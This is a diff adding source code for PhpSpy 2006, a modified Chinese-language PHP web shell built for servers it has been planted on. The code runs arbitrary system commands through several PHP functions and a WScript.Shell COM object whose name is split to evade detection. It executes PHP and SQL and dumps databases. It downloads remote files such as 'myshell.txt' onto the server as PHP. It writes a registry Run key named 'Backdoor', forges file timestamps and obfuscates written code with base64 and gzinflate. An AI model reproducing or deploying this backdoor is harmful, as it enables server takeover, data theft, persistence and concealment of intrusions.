+		header('Content-Disposition: attachment; filename='.$filename);
+		header('Content-Description: PHP Generated Data');
+		header('Content-Length: '.filesize($downfile));
+		@readfile($downfile);
+		exit;
+	}
+}
+
+// 直接下载备份数据库
+if ($_POST['backuptype'] == 'download') {
+	@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
+	@mysql_select_db($dbname) or die("选择数据库失败");	
+	$table = array_flip($_POST['table']);
+	$result = mysql_query("SHOW tables");
+	echo ($result) ? NULL : "出错: ".mysql_error();
+
+	$filename = basename($_SERVER['HTTP_HOST']."_MySQL.sql");
+	header('Content-type: application/unknown');
+	header('Content-Disposition: attachment; filename='.$filename);
+	$mysqldata = '';
+	while ($currow = mysql_fetch_array($result)) {
+		if (isset($table[$currow[0]])) {
+			$mysqldata.= sqldumptable($currow[0]);
+			$mysqldata.= $mysqldata."\r\n";
+		}
+	}
+	mysql_close();
+	exit;
+}
+
+// 程序目录
+$pathname=str_replace('\\','/',dirname(__FILE__)); 
+
+// 获取当前路径
+if (!isset($dir) or empty($dir)) {
+	$dir = ".";
+	$nowpath = getPath($pathname, $dir);
+} else {
+	$dir=$_GET['dir'];
+	$nowpath = getPath($pathname, $dir);
+}
+
+// 判断读写情况
+$dir_writeable = (dir_writeable($nowpath)) ? "可写" : "不可写";
+$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
+$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">注册表操作</a>" : "";
+
+$tb = new FORMS;
+
+?>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>http://<? echo $_SERVER['HTTP_HOST'];?>  PhpSpy 2006 修改版</title>
+<style type="text/css">
+body{
+	BACKGROUND-COLOR: #F5F5F5; 
+	COLOR: #3F3849; 
+	font-family: "Verdana", "Tahoma", "宋体";
+	font-size: "12px";
+	line-height: "140%";
+}
+
+TD		{FONT-FAMILY: "Verdana", "Tahoma", "宋体"; FONT-SIZE: 12px; line-height: 140%;}
+.smlfont {
+	font-family: "Verdana", "Tahoma", "宋体";
+	font-size: "11px";
+}
+.INPUT {
+	FONT-SIZE: "12px";
+	COLOR: "#000000";
+	BACKGROUND-COLOR: "#FFFFFF";
+	height: "18px";
+	border: "1px solid #666666";
+	padding-left: "2px";
+}
+.redfont {
+	COLOR: "#CA0000";
+}
+A:LINK		{COLOR: #3F3849; TEXT-DECORATION: none}
+A:VISITED	{COLOR: #3F3849; TEXT-DECORATION: none}
+A:HOVER		{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}
+A:ACTIVE	{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}
+.top {BACKGROUND-COLOR: "#CCCCCC"}
+.firstalt {BACKGROUND-COLOR: "#EFEFEF"}
+.secondalt {BACKGROUND-COLOR: "#F5F5F5"}
+</style>
+<SCRIPT language=JavaScript>
+function CheckAll(form) {
+	for (var i=0;i<form.elements.length;i++) {
+		var e = form.elements[i];
+		if (e.name != 'chkall')
+		e.checked = form.chkall.checked;
+    }
+}
+function really(d,f,m,t) {
+	if (confirm(m)) {
+		if (t == 1) {
+			window.location.href='?dir='+d+'&deldir='+f;
+		} else {
+			window.location.href='?dir='+d+'&delfile='+f;
+		}
+	}
+}
+</SCRIPT>
+</head>
+<body style="table-layout:fixed; word-break:break-all">
+<center>
+<?php
+$test = "";
+if(!$_GET['dir']) $dir = "./";
+$tb->tableheader();
+$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align="center">'.date("Y年m月d日 h:i:s",time()).'</td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
+$tb->tdbody('| <a href="?action=logout">注销登录</a> | <a href="?action=dir">Shell 目录</a> | <a href="?action=phpenv">环境变量</a> | <a href="?action=proxy">在线代理</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | ');
+$tb->tdbody('| <a href="?action=downloads">Http 文件下载</a> | <a href="?action=search&dir='.$dir.'">文件查找</a> | <a href="?action=eval">执行php脚本</a> | <a href="?action=sql">执行SQL语句</a> | <a href="?action=sql&type=fun">Func反弹Shell</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="?action=SUExp">Serv-U EXP</a> |');
+$tb->tablefooter();
+?>
+<hr width="775" noshade>
+<table width="775" border="0" cellpadding="0">
+<?
+$tb->headerform(array('method'=>'GET','content'=>'<p>程序路径: '.$pathname.'<br>当前目录('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>跳转目录: '.$tb->makeinput('dir').' '.$tb->makeinput('','确定','','submit').' 〖支持绝对路径和相对路径〗'));
+
+$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'上传文件到当前目录: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','确定','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));
+
+$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'新建文件在当前目录: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','确定','','submit')));
+
+$tb->headerform(array('content'=>'新建目录在当前目录: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','确定','','submit')));
+?>
+</table>
+<hr width="775" noshade>
+<?php
+/*===================== 执行操作 开始 =====================*/
+echo "<p><b>\n";
+// 删除文件
+if (!empty($delfile)) {
+	if (file_exists($delfile)) {
+		echo (@unlink($delfile)) ? $delfile." 删除成功!" : "文件删除失败!";
+	} else {
+		echo basename($delfile)." 文件已不存在!";
+	}
+}
+
+// 删除目录
+elseif (!empty($deldir)) {
+	$deldirs="$dir/$deldir";
+	if (!file_exists("$deldirs")) {
+		echo "$deldir 目录已不存在!";
+	} else {
+		echo (deltree($deldirs)) ? "目录删除成功!" : "目录删除失败!";
+	}
+}
+
+// 创建目录
+elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
+	if (!empty($newdirectory)) {
+		$mkdirs="$dir/$newdirectory";
+		if (file_exists("$mkdirs")) {
+			echo "该目录已存在!";
+		} else {
+			echo (@mkdir("$mkdirs",0777)) ? "创建目录成功!" : "创建失败!";
+			@chmod("$mkdirs",0777);
+		}
+	}
+}
+
+// 上传文件
+elseif ($doupfile) {
+	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "上传成功!" : "上传失败!";
+}
+
+// 编辑文件
+elseif ($_POST['do'] == 'doeditfile') {
+	if (!empty($_POST['editfilename'])) {
+    if(!file_exists($editfilename)) unset($retime);
+	if($time==$now) $time = @filemtime($editfilename);
+        $time2 = @date("Y-m-d H:i:s",$time);
+		$filename="$editfilename";
+		@$fp=fopen("$filename","w");
+		if($_POST['change']=="yes"){
+		$filecontent = "?".">".$_POST['filecontent']."<?";
+		$filecontent = gzdeflate($filecontent);
+        $filecontent = base64_encode($filecontent);
+        $filecontent = "<?php\n/*\n代码由浅蓝的辐射鱼加密!\n*/\neval(gzinflate(base64_decode('$filecontent')));\n"."?>";
+		}else{
+		$filecontent = $_POST['filecontent'];
+		}
+		echo $msg=@fwrite($fp,$filecontent) ? "写入文件成功!" : "写入失败!";
+		@fclose($fp);
+		if($retime=="yes"){
+        echo"&nbsp;鱼鱼自动操作:";
+        echo $msg=@touch($filename,$time) ? "修改文件为".$time2."成功!" : "修改文件时间失败!";
+		}
+	} else {
+		echo "请输入想要编辑的文件名!";
+	}
+}
+//文件下载
+elseif ($_POST['do'] == 'downloads') {
+	$contents = @file_get_contents($_POST['durl']);
+	if(!$contents){
+	echo"无法读取要下载的数据";
+	}
+	elseif(file_exists($path)){
+	echo"很抱歉，文件".$path."已经存在了，请更换保存文件名。";
+	}else{
+    $fp = @fopen($path,"w");
+	echo $msg=@fwrite($fp,$contents) ? "下载文件成功!" : "下载文件写入时失败!";
+	@fclose($fp);
+	}
+}
+
+// 编辑文件属性
+elseif ($_POST['do'] == 'editfileperm') {
+	if (!empty($_POST['fileperm'])) {
+		$fileperm=base_convert($_POST['fileperm'],8,10);
+		echo (@chmod($dir."/".$file,$fileperm)) ? "属性修改成功!" : "修改失败!";
+		echo " 文件 ".$file." 修改后的属性为: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
+	} else {
+		echo "请输入想要设置的属性!";
+	}
+}
+
+// 文件改名
+elseif ($_POST['do'] == 'rename') {
+	if (!empty($_POST['newname'])) {
+		$newname=$_POST['dir']."/".$_POST['newname'];
+		if (@file_exists($newname)) {
+			echo "".$_POST['newname']." 已经存在,请重新输入一个!";
+		} else {
+			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." 成功改名为 ".$_POST['newname']." !" : "文件名修改失败!";
+		}
+	} else {
+		echo "请输入想要改的文件名!";
+	}
+}
+elseif ($_POST['do'] == 'search') {
+if(!empty($oldkey)){
+echo"<span class=\"redfont\">查找关键词:[".$oldkey."],下面显示查找的结果:";
+	if($type2 == "getpath"){
+	echo"鼠标移到结果文件上会有部分截取显示.";
+}
+echo"</span><br><hr width=\"775\" noshade>";
+find($path);
+}else{
+echo"你要查虾米?到底要查虾米呢?有没有虾米要你查呢?";
+}
+}
+
+// 克隆时间
+elseif ($_POST['do'] == 'domodtime') {
+	if (!@file_exists($_POST['curfile'])) {
+		echo "要修改的文件不存在!";
+	} else {
+		if (!@file_exists($_POST['tarfile'])) {
+			echo "要参照的文件不存在!";
+		} else {
+			$time=@filemtime($_POST['tarfile']);
+			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." 的修改时间成功改为 ".date("Y-m-d H:i:s",$time)." !" : "文件的修改时间修改失败!";
+		}
+	}
+}
+
+// 自定义时间
+elseif ($_POST['do'] == 'modmytime') {
+	if (!@file_exists($_POST['curfile'])) {
+		echo "要修改的文件不存在!";
+	} else {
+		$year=$_POST['year'];
+		$month=$_POST['month'];
+		$data=$_POST['data'];		
+		$hour=$_POST['hour'];
+		$minute=$_POST['minute'];
+		$second=$_POST['second'];
+		if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {
+			$time=strtotime("$data $month $year $hour:$minute:$second");
+			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." 的修改时间成功改为 ".date("Y-m-d H:i:s",$time)." !" : "文件的修改时间修改失败!";
+		}
+	}
+}
+
+// 连接MYSQL
+elseif ($connect) {
+	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
+		echo "数据库连接成功!";
+		mysql_close();
+	} else {
+		echo mysql_error();
+	}
+}
+
+// 执行SQL语句
+elseif ($_POST['do'] == 'query') {
+	@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
+	@mysql_select_db($dbname) or die("选择数据库失败");
+	$result = @mysql_query($_POST['sql_query']);
+	echo ($result) ? "SQL语句成功执行!" : "出错: ".mysql_error();
+	mysql_close();
+}
+
+// 备份操作
+elseif ($_POST['do'] == 'backupmysql') {
+	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
+		echo "请选择欲备份的数据表和备份方式!";
+	} else {
+		if ($_POST['backuptype'] == 'server') {
+			@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
+			@mysql_select_db($dbname) or die("选择数据库失败");	
+			$table = array_flip($_POST['table']);
+			$filehandle = @fopen($path,"w");
+			if ($filehandle) {
+				$result = mysql_query("SHOW tables");
+				echo ($result) ? NULL : "出错: ".mysql_error();
+				while ($currow = mysql_fetch_array($result)) {
+					if (isset($table[$currow[0]])) {
+						sqldumptable($currow[0], $filehandle);
+						fwrite($filehandle,"\n\n\n");
+					}
+				}
+				fclose($filehandle);
+				echo "数据库已成功备份到 <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
+				mysql_close();
+			} else {
+				echo "备份失败,请确认目标文件夹是否具有可写权限!";
+			}
+		}
+	}
+}
+
+// 打包下载 PS:文件太大可能非常慢
+// Thx : 小花
+elseif($downrar) {
+	if (!empty($dl)) {
+		$dfiles="";
+		foreach ($dl AS $filepath=>$value) {
+			$dfiles.=$filepath.",";
+		}
+		$dfiles=substr($dfiles,0,strlen($dfiles)-1);
+		$dl=explode(",",$dfiles);
+		$zip=new PHPZip($dl);
+		$code=$zip->out;		
+		header("Content-type: application/octet-stream");
+		header("Accept-Ranges: bytes");
+		header("Accept-Length: ".strlen($code));
+		header("Content-Disposition: attachment;filename=".$_SERVER['HTTP_HOST']."_Files.tar.gz");
+		echo $code;
+		exit;
+	} else {
+		echo "请选择要打包下载的文件!";
+	}
+}
+
+// Shell.Application 运行程序
+elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
+	$shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');
+	$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);
+	echo ($a=='0') ? "程序已经成功执行!" : "程序运行失败!";
+}
+
+// 查看PHP配置参数状况
+elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
+	echo "配置参数 ".$_POST['phpvarname']." 检测结果: ".getphpcfg($_POST['phpvarname'])."";
+}
+
+// 读取注册表
+elseif(($regread) AND !empty($_POST['readregname'])) {
+	$shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');
+	var_dump(@$shell->RegRead($_POST['readregname']));
+}
+
+// 写入注册表
+elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
+	$shell= &new COM('W'.'Scr'.'ipt.S'.'hell');
+	$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);
+	echo ($a=='0') ? "写入注册表健值成功!" : "写入 ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." 失败!";
+}
+
+// 删除注册表
+elseif(($regdelete) AND !empty($_POST['delregname'])) {
+	$shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');
+	$a = @$shell->RegDelete($_POST['delregname']);
+	echo ($a=='0') ? "删除注册表健值成功!" : "删除 ".$_POST['delregname']." 失败!";
+}
+
+else {
+	echo "$notice";
+}
+
+echo "</b></p>\n";
+/*===================== 执行操作 结束 =====================*/
+
+if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
+	$tb->tableheader();
+?>
+  <tr bgcolor="#cccccc">
+    <td align="center" nowrap width="27%"><b>文件</b></td>
+	<td align="center" nowrap width="16%"><b>创建日期</b></td>
+    <td align="center" nowrap width="16%"><b>最后修改</b></td>
+    <td align="center" nowrap width="11%"><b>大小</b></td>
+    <td align="center" nowrap width="6%"><b>属性</b></td>
+    <td align="center" nowrap width="24%"><b>操作</b></td>
+  </tr>
+<?php
+// 目录列表
+$dirs=@opendir($dir);
+$dir_i = '0';
+while ($file=@readdir($dirs)) {
+	$filepath="$dir/$file";
+	$a=@is_dir($filepath);
+	if($a=="1"){
+		if($file!=".." && $file!=".")	{
+			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
+			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
+			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
+			echo "<tr class=".getrowbg().">\n";
+			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
+			echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
+			echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
+			echo "  <td align=\"center\" nowrap class=\"smlfont\">&lt;dir&gt;</td>\n";
+			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
+			echo "  <td align=\"center\" nowrap>| <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','你确定要删除 $file 目录吗? \\n\\n如果该目录非空,此次操作将会删除该目录下的所有文件!','1')\">删除</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($file)."\">改名</a> |</td>\n";
+			echo "</tr>\n";
+			$dir_i++;
+		} else {
+			if($file=="..") {
+				echo "<tr class=".getrowbg().">\n";
+				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">返回上级目录</a></td>\n";
+				echo "</tr>\n";
+			}
+		}
+	}
+}// while
+@closedir($dirs); 
+?>
+<tr bgcolor="#cccccc">
+  <td colspan="6" height="5"></td>
+</tr>
+<FORM action="" method="POST">
+<?
+// 文件列表
+$dirs=@opendir($dir);
+$file_i = '0';
+while ($file=@readdir($dirs)) {
+	$filepath="$dir/$file";
+	$a=@is_dir($filepath);
+	if($a=="0"){		
+		$size=@filesize($filepath);
+		$size=$size/1024 ;
+		$size= @number_format($size, 3);
+		if (@filectime($filepath) == @filemtime($filepath)) {
+			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
+			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
+		} else {
+			$ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
+			$mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
+		}
+		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
+		echo "<tr class=".getrowbg().">\n";
+		echo "  <td style=\"padding-left: 5px;\">";
+		echo "<INPUT type=checkbox value=1 name=dl[$filepath]>";
+		echo "<a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
+		echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
+		echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
+		echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
+		echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
+		echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\">下载</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">编辑</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','你确定要删除 $file 文件吗?','2')\">删除</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\">改名</a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">时间</a></td>\n";
+		echo "</tr>\n";
+		$file_i++;
+	}
+}// while
+@closedir($dirs); 
+$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' '.$tb->makeinput('downrar','选中文件打包下载','','submit').'</td><td align="right">'.$dir_i.' 个目录 / '.$file_i.' 个文件</td></tr></table>','center',getrowbg(),'','','6');
+
+echo "</FORM>\n";
+echo "</table>\n";
+}// end dir
+
+elseif ($_GET['action'] == "editfile") {
+	if(empty($newfile)) {
+		$filename="$dir/$editfile";
+		$fp=@fopen($filename,"r");
+		$contents=@fread($fp, filesize($filename));
+		@fclose($fp);
+		$contents=htmlspecialchars($contents);
+	}else{
+		$editfile=$newfile;
+		$filename = "$dir/$editfile";
+	}
+	$action = "?dir=".urlencode($dir)."&editfile=".$editfile;
+	$tb->tableheader();
+	$tb->formheader($action,'新建/编辑文件');
+	$tb->tdbody('当前文件: '.$tb->makeinput('editfilename',$filename).' 输入新文件名则建立新文件 Php代码加密: <input type="checkbox" name="change" value="yes" onclick="javascript:alert(\'这个功能只可以用来加密或是压缩完整的php代码。\\n\\n非php代码或不完整php代码或不支持gzinflate函数请不要使用！\')"> ');
+	$tb->tdbody($tb->maketextarea('filecontent',$contents));
+	$tb->makehidden('do','doeditfile');
+	$tb->formfooter('1','30');
+}//end editfile
+
+elseif ($_GET['action'] == "rename") {
+	$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);
+	$action = "?dir=".urlencode($dir)."&fname=".urlencode($fname);
+	$tb->tableheader();
+	$tb->formheader($action,'修改文件名');
+	$tb->makehidden('oldname',$dir."/".$nowfile);
+	$tb->makehidden('dir',$dir);
+	$tb->tdbody('当前文件名: '.basename($nowfile));
+	$tb->tdbody('改名为: '.$tb->makeinput('newname'));
+	$tb->makehidden('do','rename');
+	$tb->formfooter('1','30');
+}//end rename
+
+elseif ($_GET['action'] == "eval") {
+	$action = "?dir=".urlencode($dir)."";
+	$tb->tableheader();
+	$tb->formheader(''.$action.' "target="_blank' ,'执行php脚本');
+	$tb->tdbody($tb->maketextarea('phpcode',$contents));
+	$tb->formfooter('1','30');
+	
+}
+elseif ($_GET['action'] == "fileperm") {
+	$action = "?dir=".urlencode($dir)."&file=".$file;
+	$tb->tableheader();
+	$tb->formheader($action,'修改文件属性');
+	$tb->tdbody('修改 '.$file.' 的属性为: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
+	$tb->makehidden('file',$file);
+	$tb->makehidden('dir',urlencode($dir));
+	$tb->makehidden('do','editfileperm');
+	$tb->formfooter('1','30');
+}//end fileperm
+
+elseif ($_GET['action'] == "newtime") {
+	$action = "?dir=".urlencode($dir);
+	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
+	$tb->tableheader();
+	$tb->formheader($action,'克隆文件最后修改时间');
+	$tb->tdbody("修改文件: ".$tb->makeinput('curfile',$file,'readonly')." → 目标文件: ".$tb->makeinput('tarfile','需填完整路径及文件名'),'center','2','30');
+	$tb->makehidden('do','domodtime');
+	$tb->formfooter('','30');
+	$tb->formheader($action,'自定义文件最后修改时间');
+	$tb->tdbody('<br><ul><li>有效的时间戳典型范围是从格林威治时间 1901 年 12 月 13 日 星期五 20:45:54 到 2038年 1 月 19 日 星期二 03:14:07<br>(该日期根据 32 位有符号整数的最小值和最大值而来)</li><li>说明: 日取 01 到 30 之间, 时取 0 到 24 之间, 分和秒取 0 到 60 之间!</li></ul>','left');
+	$tb->tdbody('当前文件名: '.$file);
+	$tb->makehidden('curfile',$file);
+	$tb->tdbody('修改为: '.$tb->makeinput('year','1984','','text','4').' 年 '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' 月 '.$tb->makeinput('data','18','','text','2').' 日 '.$tb->makeinput('hour','20','','text','2').' 时 '.$tb->makeinput('minute','00','','text','2').' 分 '.$tb->makeinput('second','00','','text','2').' 秒','center','2','30');
+	$tb->makehidden('do','modmytime');
+	$tb->formfooter('1','30');
+}//end newtime
+
+elseif ($_GET['action'] == "shell") {
+	$action = "??action=shell&dir=".urlencode($dir);
+	$tb->tableheader();
+	$tb->tdheader('WebShell Mode');
+  if (substr(PHP_OS, 0, 3) == 'WIN') {
+		$program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
+		$prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";
+		echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
+		$tb->tdbody('无回显运行程序 → 文件: '.$tb->makeinput('program',$program).' 参数: '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
+		$tb->makehidden('do','programrun');
+		echo "</form>\n";
+	}
+ echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
+ if(isset($_POST['cmd'])) $cmd = $_POST['cmd'];
+	$tb->tdbody('提示:如果输出结果不完全,建议把输出结果写入文件.这样可以得到全部内容. ');
+	$tb->tdbody('proc_open函数假设不是默认的winnt系统请自行设置使用,自行修改记得写退出,否则会在主机上留下一个未结束的进程.');
+	$tb->tdbody('proc_open函数要使用的cmd程序的位置:'.$tb->makeinput('cmd',$cmd,'','text','30').'(要是是linux系统还是大大们自己修改吧)');
+   $execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell','proc_open'=>'proc_open') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','proc_open'=>'proc_open');
+   $tb->tdbody('选择执行函数: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' 输入命令: '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
+?>
+  <tr class="secondalt">
+    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
+	if (!empty($_POST['command'])) {
+		if ($execfunc=="system") {
+			system($_POST['command']);
+		} elseif ($execfunc=="passthru") {
+			passthru($_POST['command']);
+		} elseif ($execfunc=="exec") {
+			$result = exec($_POST['command']);
+			echo $result;
+		} elseif ($execfunc=="shell_exec") {
+			$result=shell_exec($_POST['command']);
+			echo $result;	
+		} elseif ($execfunc=="popen") {
+			$pp = popen($_POST['command'], 'r');
+			$read = fread($pp, 2096);
+			echo $read;
+			pclose($pp);
+		} elseif ($execfunc=="wscript") {
+			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
+			$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
+			$stdout = $exec->StdOut();
+			$stroutput = $stdout->ReadAll();
+			echo $stroutput;
+		} elseif($execfunc=="proc_open"){
+$descriptorspec = array(
+   0 => array("pipe", "r"),
+   1 => array("pipe", "w"),
+   2 => array("pipe", "w")
+);
+$process = proc_open("".$_POST['cmd']."", $descriptorspec, $pipes);
+if (is_resource($process)) {
+
+    // 写命令
+    fwrite($pipes[0], "".$_POST['command']."\r\n");
+    fwrite($pipes[0], "exit\r\n");
+    fclose($pipes[0]);
+    // 读取输出
+    while (!feof($pipes[1])) {
+        echo fgets($pipes[1], 1024);
+    }
+    fclose($pipes[1]);
+    while (!feof($pipes[2])) {
+        echo fgets($pipes[2], 1024);
+      }
+    fclose($pipes[2]);
+
+    proc_close($process);
+}
+		} else {
+			system($_POST['command']);
+		}
+	}
+	?></textarea></td>
+  </tr>  
+  </form>
+</table>
+<?php
+}//end shell
+
+elseif ($_GET['action'] == "reg") {
+	$action = '?action=reg';
+	$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';
+	$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';
+	$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
+	$delregname = $_POST['delregname'];
+	$tb->tableheader();
+	$tb->formheader($action,'读取注册表');
+	$tb->tdbody('键值: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','读取','','submit'),'center','2','50');
+	echo "</form>";
+
+	$tb->formheader($action,'写入注册表');
+	$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
+	$tb->tdbody('键值: '.$tb->makeinput('writeregname',$registre,'','text','56').' 类型: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' 值:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','写入','','submit'),'center','2','50');
+	echo "</form>";
+
+	$tb->formheader($action,'删除注册表');
+	$tb->tdbody('键值: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','删除','','submit'),'center','2','50');
+	echo "</form>";
+	$tb->tablefooter();
+}//end reg
+elseif ($_GET['action'] == "downloads"){
+$action = '?action=dir';
+	$tb->tableheader();
+	$tb->formheader($action,'http文件下载模式');
+	$tb->tdbody('你可以使用本功能把一些小工具以http方式下载到此服务器','center');
+	$tb->tdbody('文件位置: '.$tb->makeinput('durl','http://blog.blackwoods.com/miyabi/myshell.txt','','text','70').'<br>下载到:'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','下载','','submit'),'center','1','35');
+	echo "</form>";
+	$tb->tdbody('注意,假设文件太大将无法下载下来而且影响执行速度.','center');
+	$tb->tablefooter();
+}
+elseif ($_GET['action'] == "search"){
+$action = '?dir='.$dir.'';
+	$tb->tableheader();
+	$tb->formheader($action,'文件查找');
+	$tb->tdbody('你可以使用本功能查找一个目录下的文件里哪写文件包含着关键词!','center');
